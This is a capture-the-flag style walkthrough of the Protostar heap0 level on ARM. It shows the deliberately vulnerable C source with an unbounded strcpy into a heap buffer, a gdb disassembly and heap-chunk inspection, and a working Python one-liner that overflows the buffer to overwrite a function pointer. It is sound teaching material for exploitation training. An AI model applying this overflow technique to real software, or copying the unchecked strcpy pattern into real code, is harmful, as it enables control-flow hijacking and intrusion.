## Protostar ARM heap0

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);

  f->fp();

}

```
#### _Let's start_

We start with the challenges related to the heap. As we can see from the source code, to solve the challenge, we have to change the code flow, overwriting `f->fp`, which is set with the address of the function `nowinner()`.


```c
pi@raspberrypi:~/protostar/heap/heap0 $ ./heap0 AAAA
data is at 0x22150, fp is at 0x22198
level has not been passed
```

Let's run the program, disassemble the main function, look for `winner()` and `nowinner()` addresses and look to the [heap chunk](https://sourceware.org/glibc/wiki/MallocInternals) related to `d` (0x22150).
```code
pi@raspberrypi:~/protostar/heap/heap0 $ gdb ./heap0
...
Reading symbols from ./heap0...done.
gef➤  disassemble main
Dump of assembler code for function main:
   0x000104d4 <+0>:	push	{r11, lr}
   0x000104d8 <+4>:	add	r11, sp, #4
   0x000104dc <+8>:	sub	sp, sp, #16
   0x000104e0 <+12>:	str	r0, [r11, #-16]
   0x000104e4 <+16>:	str	r1, [r11, #-20]	; 0xffffffec
   0x000104e8 <+20>:	mov	r0, #64	; 0x40
   0x000104ec <+24>:	bl	0x1037c <malloc@plt>
   0x000104f0 <+28>:	mov	r3, r0
   0x000104f4 <+32>:	str	r3, [r11, #-8]
   0x000104f8 <+36>:	mov	r0, #4
   0x000104fc <+40>:	bl	0x1037c <malloc@plt>
   0x00010500 <+44>:	mov	r3, r0
   0x00010504 <+48>:	str	r3, [r11, #-12]
   0x00010508 <+52>:	ldr	r3, [r11, #-12]
   0x0001050c <+56>:	ldr	r2, [pc, #72]	; 0x1055c <main+136>
   0x00010510 <+60>:	str	r2, [r3]
   0x00010514 <+64>:	ldr	r2, [r11, #-12]
   0x00010518 <+68>:	ldr	r1, [r11, #-8]
   0x0001051c <+72>:	ldr	r0, [pc, #60]	; 0x10560 <main+140>
   0x00010520 <+76>:	bl	0x10358 <printf@plt>
   0x00010524 <+80>:	ldr	r2, [r11, #-8]
   0x00010528 <+84>:	ldr	r3, [r11, #-20]	; 0xffffffec
   0x0001052c <+88>:	add	r3, r3, #4
   0x00010530 <+92>:	ldr	r3, [r3]
   0x00010534 <+96>:	mov	r1, r3
   0x00010538 <+100>:	mov	r0, r2
   0x0001053c <+104>:	bl	0x10364 <strcpy@plt>
   0x00010540 <+108>:	ldr	r3, [r11, #-12]
   0x00010544 <+112>:	ldr	r3, [r3]
   0x00010548 <+116>:	blx	r3
   0x0001054c <+120>:	mov	r3, #0
   0x00010550 <+124>:	mov	r0, r3
   0x00010554 <+128>:	sub	sp, r11, #4
   0x00010558 <+132>:	pop	{r11, pc}
   0x0001055c <+136>:			; <UNDEFINED> instruction: 0x000104b8
   0x00010560 <+140>:	andeq	r0, r1, r0, lsl #12
   End of assembler dump.
gef➤  p winner
$1 = {void ()} 0x1049c <winner>
gef➤  p nowinner
$2 = {void ()} 0x104b8 <nowinner>
gef➤  heap chunk 0x22150
Chunk(addr=0x22150, size=0x48, flags=PREV_INUSE)
Chunk size: 72 (0x48)
Usable size: 68 (0x44)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```
As we can see, the size of the chunk related to `d` is 72 bytes starting at `0x22150` and at `0x22198` the heap chunk related to `fp`  starts. If we fill the 72 bytes of the `d` chunk, the next byte in our string will be able to overwrite the `f->fp()` value.

Let's try
```code
pi@raspberrypi:~/protostar/heap/heap0 $ ./heap0 $(python -c "print 'A'*72 + '\x9c\x04\x01'")
data is at 0x22150, fp is at 0x22198
level passed
```
__*Done :)*__
